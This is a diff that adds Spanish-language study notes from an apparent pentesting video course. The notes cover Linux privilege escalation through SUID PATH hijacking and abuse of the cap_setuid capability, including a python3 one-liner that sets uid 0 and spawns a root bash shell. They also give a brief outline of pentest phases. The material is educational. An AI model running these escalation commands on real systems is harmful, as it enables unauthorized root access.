@@ -249,7 +249,89 @@ creamos un fichero en touch /tmp/ps
 
 escrimos en el "bash -p" para aprovecharnos del suid
 
+alteramos el path
+
 export PATH=/tmp:$PATH
+
+
+ejecutamos el programa
+
+./backup
+
+whoami
+
+id
+
+(probar el mismo concepto pero con ls)
+
+
+# video 13 explotación y abuso de las capabilities en linux
+
+¿que es una capabiliti?
+
+//buscar capabilities 
+getcap -r / 2>/dev/null
+
+getcap /usr/bin/python3.8
+
+setcap cap_setuid+ep /usr/bin/python3.8
+
+//borrar capability
+setcap -r /usr/bin/python3.8
+
+
+//como aprovechamos la capatabiliti
+ls -l /usr/bin/python3.8 tiene activado ese capabiliti
+
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")
+
+BUSCAR EN INTERNET EL TIPO DE CAPABILITIS
+
+# video 14 que es el pentesting
+
+¿Como hacker una maquina? -> independiente del sistema operativo (mac, linux, windows)
+
+el objetivo es tener definida una buena metodología
+
+Distintas fases:
+
+-> fases de reconocimiento
+    ¿que tipo de máquina ? -> linux, windows, etc    
+
+    (una máquina corre servicios y normalmente estan espuextos hacia el exterior -> servidor web http )
+    (una vez que reconocemos el servicio podemos saber por su version y tipo si puede tener algún tipo de vulnerabilidad)
+
+    ->nmap, herramientas bash y python propias
+
+-> Analisis de vulnerabilidades 
+    Identificar la version que corre un servicio -> ver si existe en alguna base de datos searchexploit, msfconsole etc
+    un exploit que pueda aprovechar esa vulnerabilidad
+
+    
+-> fase de explotacion 
+    Tener cuidado con algunos exploit que cuando se lanzan afectan a la disponiblidad   y el servicio se puede ir a dormir haha
+
+-> Auditaria -> sobre los resultados obtenidos
+    * que vulnerabilidades se han podido explotar, como ha sido el proceso, paso a paso, 
+
+-> Documentacion
+    -> ejecutivo
+
+    -> técnico
+
+    
+
+
+auditar una web 
+
+-> identificar el gestor de contenido
+    -> wordpress, etc
+
+COnceptos:
+
+exploit - searchexploit
+
+
 
 
 
